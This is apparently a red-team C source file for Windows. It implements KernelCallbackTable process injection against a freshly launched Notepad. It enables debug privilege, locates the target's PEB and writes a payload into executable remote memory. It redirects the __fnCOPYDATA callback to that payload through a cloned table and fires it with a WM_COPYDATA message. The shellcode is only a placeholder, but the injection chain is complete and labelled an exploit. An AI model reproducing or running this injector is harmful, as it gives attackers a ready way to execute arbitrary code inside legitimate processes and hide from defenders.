 /* References:
   * https://cocomelonc.github.io/tutorial/2022/01/24/malware-injection-15.html
   * https://captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection.html
   * https://arorarachit.com/blog/windows-process-injection-via-kernelcallbacktable
   * https://attack.mitre.org/techniques/T1574/013/
   * https://github.com/capt-meelo/KernelCallbackTable-Injection/blob/master/KCT.cpp
*/
#include <stdio.h>
#include <windows.h>
#include "struct.h"
#include "helper.h"

void LoadNtQueryInformationProcess()
{
    printf( COLOR_YELLOW_BOLD "[*] Loading NtQueryInformationProcess...\n" COLOR_RESET );
    HMODULE hNtdll = GetModuleHandle( L"ntdll.dll" );
    if ( hNtdll )
    {
        NtQueryInformationProcess = ( PFN_NTQUERYINFORMATIONPROCESS ) GetProcAddress( hNtdll, "NtQueryInformationProcess" );
        if ( NtQueryInformationProcess )
        {
            printf( COLOR_GREEN_BOLD "[+] NtQueryInformationProcess loaded successfully at address: 0x%p\n" COLOR_RESET, NtQueryInformationProcess );
        }
        else
        {
            printf( COLOR_RED_BOLD "\t[-] Failed to resolve NtQueryInformationProcess address.\n" COLOR_RESET );
        }
    }
}

void EnableDebugPrivilege()
{
    printf( COLOR_YELLOW_BOLD "[*] Enabling Debug Privilege...\n" COLOR_RESET );
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    if ( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
    {
        LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &tkp.Privileges[ 0 ].Luid );
        tkp.PrivilegeCount = 1;
        tkp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges( hToken, FALSE, &tkp, sizeof( tkp ), NULL, NULL );
        CloseHandle( hToken );
        // printf( COLOR_GREEN_BOLD "\t[+] Debug Privilege enabled.\n" COLOR_RESET );
    }
    else
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to enable Debug Privilege.\n" COLOR_RESET );
    }
}


unsigned char payload[] = "HI?-PUT-YOUR-SHELLCODE-HERE_BYE-:)";
SIZE_T shellcodeSize = sizeof( payload ) - 1;
SIZE_T bytesRead = 0;

int main()
{
    printf( COLOR_YELLOW_BOLD "[*] Initializing exploit...\n" COLOR_RESET );

    EnableDebugPrivilege();
    LoadNtQueryInformationProcess();

    if ( !NtQueryInformationProcess )
    {
        printf( COLOR_RED_BOLD "\t[-] NtQueryInformationProcess is NULL. Exiting...\n" COLOR_RESET );
        return -1;
    }

    printf( COLOR_YELLOW_BOLD "[*] Starting PEB KernelCallbackTable Injection Exploit...\n\n" COLOR_RESET );

    // Step 1: Create a new Notepad process (ensure it is visible to the user)
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFO si = { sizeof( STARTUPINFO ) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    printf( COLOR_YELLOW_BOLD "\t[*] Creating new Notepad process...\n" COLOR_RESET );
    if ( !CreateProcess(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    ) )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to create Notepad process. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }

    printf( COLOR_GREEN_BOLD "\t[+] Notepad process created successfully. PID: %d\n" COLOR_RESET, pi.dwProcessId );

    // Step 2: Wait for the new process to initialize
    printf( COLOR_YELLOW_BOLD "\t[*] Waiting for Notepad initialization...\n" COLOR_RESET );
    WaitForInputIdle( pi.hProcess, 1000 );

    // Step 3: Find the Notepad window handle
    HWND hWindow = NULL;
    DWORD waitTime = 0;
    while ( hWindow == NULL && waitTime < MAX_WAIT_TIME )
    {
        hWindow = FindWindow( L"Notepad", NULL );
        if ( !hWindow )
        {
            Sleep( 500 );  // Wait for 500 ms before retrying
            waitTime += 500;
        }
    }

    if ( !hWindow )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to find Notepad window handle after waiting for %d milliseconds.\n" COLOR_RESET, MAX_WAIT_TIME );
        TerminateProcess( pi.hProcess, 0 );
        CloseHandle( pi.hProcess );
        CloseHandle( pi.hThread );
        return -1;
    }

    printf( COLOR_GREEN_BOLD "\t[+] Window Handle found: 0x%p\n" COLOR_RESET, hWindow );

    // Step 4: Get the process ID of the Notepad
    DWORD pid;
    GetWindowThreadProcessId( hWindow, &pid );
    printf( COLOR_GREEN_BOLD "\t[+] Process ID: %d\n" COLOR_RESET, pid );

    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        FALSE,
        pid
    );
    if ( !hProcess )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to open target process. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    printf( COLOR_GREEN_BOLD "\t[+] Process Handle: 0x%p\n" COLOR_RESET, hProcess );

    // -----------------------------------------------------
    // Using NtQueryInformationProcess to get PEB
    // -----------------------------------------------------
    printf( COLOR_YELLOW_BOLD "\t[*] Retrieving PEB Address using NtQueryInformationProcess...\n" COLOR_RESET );
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof( pbi ),
        &returnLength
    );
    if ( status != 0 )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to query process information. NTSTATUS: 0x%lx\n" COLOR_RESET, status );
        return -1;
    }
    PVOID PebBaseAddress = pbi.PebBaseAddress;
    printf( COLOR_BLUE_BOLD "\t\t[*] PEB Address: 0x%p\n" COLOR_RESET, PebBaseAddress );

    // Step 6: Read KernelCallbackTable from the target process's PEB
    PVOID KernelCallbackTable;
    SIZE_T bytesRead = 0;
    if ( !ReadProcessMemory(
        hProcess,
        ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ),
        &KernelCallbackTable,
        sizeof( PVOID ),
        &bytesRead
    ) )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to read KernelCallbackTable. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    printf( COLOR_BLUE_BOLD "\t\t[*] KernelCallbackTable Address: 0x%p\n" COLOR_RESET, KernelCallbackTable );

    // Step 7: Read KernelCallbackTable structure from the target process
    KERNELCALLBACKTABLE CCC;
    if ( !ReadProcessMemory(
        hProcess,
        KernelCallbackTable,
        &CCC,
        sizeof( CCC ),
        &bytesRead
    ) )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to read KernelCallbackTable structure. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    printf( COLOR_GREEN_BOLD "\n\t[+] KernelCallbackTable read successfully. %zu bytes read.\n" COLOR_RESET, bytesRead );
    printf( COLOR_BLUE_BOLD "\t\t[*] Dumping KernelCallbackTable structure:\n" COLOR_RESET );
    printf( COLOR_GREEN_BOLD "\t\t\t__fnCOPYDATA: 0x%p\n" COLOR_RESET, ( void* ) CCC.__fnCOPYDATA );
    printf( COLOR_GREEN_BOLD "\t\t\t__fnCOPYGLOBALDATA: 0x%p\n" COLOR_RESET, ( void* ) CCC.__fnCOPYGLOBALDATA );
    printf( COLOR_GREEN_BOLD "\t\t\t__fnDWORD: 0x%p\n" COLOR_RESET, ( void* ) CCC.__fnDWORD );

    // -----------------------------------------------------
    // Assembly Method: Using LocatePEB and ResolveKernelCallbackTable
    // -----------------------------------------------------
    /*
    // 
    printf( COLOR_YELLOW_BOLD "\t[*] Retrieving PEB Address using Assembly...\n" COLOR_RESET );
    PVOID PebBaseAddressASM = LocatePEB();
    printf( COLOR_BLUE_BOLD "\t\t[*] PEB Address (from ASM): 0x%p\n" COLOR_RESET, PebBaseAddressASM );

    printf( COLOR_YELLOW_BOLD "\t[*] Resolving KernelCallbackTable using Assembly...\n" COLOR_RESET );
    PVOID KernelCallbackTableASM = ResolveKernelCallbackTable( PebBaseAddressASM );
    printf( COLOR_BLUE_BOLD "\t\t[*] KernelCallbackTable Address (from ASM): 0x%p\n" COLOR_RESET, KernelCallbackTableASM );

    // Continue using KernelCallbackTableASM as needed
    */

    // Step 8: Write payload to remote buffer
    printf( COLOR_YELLOW_BOLD "\n\t[*] Allocating remote buffer for payload...\n" COLOR_RESET );
    LPVOID remotebuf = VirtualAllocEx(
        hProcess,
        NULL,
        shellcodeSize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    if ( !remotebuf )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to allocate remote buffer. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    if ( !WriteProcessMemory(
        hProcess,
        remotebuf,
        payload,
        shellcodeSize,
        NULL
    ) )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to write payload to remote buffer. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    printf( COLOR_GREEN_BOLD "\t[+] Payload written to remote buffer at: 0x%p\n" COLOR_RESET, remotebuf );

    // Step 9: Modify __fnCOPYDATA in the KernelCallbackTable
    printf( COLOR_YELLOW_BOLD "\t[*] Modifying __fnCOPYDATA to point to payload...\n" COLOR_RESET );
    CCC.__fnCOPYDATA = ( ULONG_PTR ) remotebuf;
    printf( COLOR_BLUE_BOLD "\t\t[*] __fnCOPYDATA now points to: 0x%p\n" COLOR_RESET, remotebuf );

    // Step 10: Clone modified KernelCallbackTable
    printf( COLOR_YELLOW_BOLD "\n\t[*] Cloning modified KernelCallbackTable...\n" COLOR_RESET );
    LPVOID cloneCCC = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof( CCC ),
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE
    );
    if ( !cloneCCC )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to allocate memory for cloned KernelCallbackTable. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    if ( !WriteProcessMemory(
        hProcess,
        cloneCCC,
        &CCC,
        sizeof( CCC ),
        NULL
    ) )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to write cloned KernelCallbackTable. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    printf( COLOR_GREEN_BOLD "\t[+] Cloned KernelCallbackTable written at: 0x%p\n" COLOR_RESET, cloneCCC );

    // Step 11: Update PEB KernelCallbackTable to cloned KernelCallbackTable
    printf( COLOR_YELLOW_BOLD "\t[*] Updating PEB with cloned KernelCallbackTable...\n" COLOR_RESET );
    if ( !WriteProcessMemory(
        hProcess,
        ( PBYTE ) PebBaseAddress + offsetof( PEB, KernelCallbackTable ),
        &cloneCCC,
        sizeof( PVOID ),
        &bytesRead
    ) )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to update PEB KernelCallbackTable. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    printf( COLOR_GREEN_BOLD "\t[+] PEB KernelCallbackTable updated successfully!\n" COLOR_RESET );

    // Step 12: Ensure Memory Protection for Payload
    DWORD oldProtect;
    if ( !VirtualProtectEx(
        hProcess,
        remotebuf,
        shellcodeSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    ) )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to change memory protection for payload. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    printf( COLOR_GREEN_BOLD "\t[+] Memory protection for payload set to PAGE_EXECUTE_READ.\n" COLOR_RESET );

    // Step 13: Trigger the payload
    printf( COLOR_YELLOW_BOLD "\t[*] Sending message to trigger the payload...\n" COLOR_RESET );
    COPYDATASTRUCT cds;
    WCHAR msg[] = L"LJX";
    cds.dwData = 1;
    cds.cbData = ( lstrlenW( msg ) + 1 ) * sizeof( WCHAR );
    cds.lpData = msg;
    LRESULT result = SendMessage(
        hWindow,
        WM_COPYDATA,
        ( WPARAM ) hWindow,
        ( LPARAM ) &cds
    );
    if ( result == 0 && GetLastError() != 0 )
    {
        printf( COLOR_RED_BOLD "\t[-] Failed to send message to trigger payload. Error: %d\n" COLOR_RESET, GetLastError() );
        return -1;
    }
    printf( COLOR_GREEN_BOLD "\t[+] Payload triggered!\n" COLOR_RESET );

    // Cleanup
    printf( COLOR_YELLOW_BOLD "\t[*] Cleaning up...\n" COLOR_RESET );
    VirtualFreeEx( hProcess, remotebuf, 0, MEM_RELEASE );
    VirtualFreeEx( hProcess, cloneCCC, 0, MEM_RELEASE );
    TerminateProcess( pi.hProcess, 0 );
    CloseHandle( hProcess );
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );

    printf( COLOR_GREEN_BOLD "\n[+] YAAAAAAAAAY.\n" COLOR_RESET );
    printf( COLOR_GREEN_BOLD "[+] Exploit completed successfully.\n" COLOR_RESET );
    return 0;
}
